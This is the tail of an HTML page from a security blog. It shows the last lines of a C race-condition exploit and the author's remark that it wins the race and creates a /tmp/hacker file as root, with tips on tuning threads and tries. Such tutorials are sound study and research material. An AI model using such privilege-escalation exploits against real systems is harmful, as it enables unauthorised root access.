</span><span style="color:#75715e"></span>	finish <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;

	pthread_join(<span style="color:#66d9ef">thread</span>, NULL);

	close(fd);

	<span style="color:#66d9ef">return</span> EXIT_SUCCESS;
}
</code></pre></div><p>This code will win the race on my machine and create a <code>/tmp/hacker</code> file as the root user after compiling and running it!
You may need to change some variables like the amount of tries and the amount of threads a little to make it work, as with all race-conditions.</p>
<p>That was the end of the first section! I hope you enjoyed it. Comments or suggestions are welcome on jordy [a-t] pwning.systems :).</p>
<p>Cheeers!</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="https://pwning.systems/posts/setting-up-a-kernel-debugging-environment/">
                <span class="button__icon">←</span>
                <span class="button__text">Setting Up a Kernel Debugging Environment</span>
            </a>
        </span>
        
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Jordy Zomer</span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://pwning.systems/assets/main.js"></script>
<script src="https://pwning.systems/assets/prism.js"></script>







  
</div>

</body>
</html>
